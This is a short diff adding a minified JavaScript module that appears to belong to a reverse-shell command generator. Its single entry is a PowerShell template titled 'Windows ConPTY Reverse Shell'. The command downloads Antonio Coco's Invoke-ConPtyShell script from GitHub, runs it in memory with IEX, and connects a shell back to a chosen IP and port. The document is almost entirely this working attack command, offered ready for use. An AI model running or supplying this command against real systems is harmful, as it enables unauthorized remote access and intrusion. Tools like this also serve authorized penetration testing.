@@ -1,0 +1,1 @@
+const e=[{title:"Windows ConPTY Reverse Shell (PowerShell)",template:"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",description:"PowerShell reverse shell using ConPTY from Antonio Coco's script."}],o={commands:e};export{e as commands,o as default};
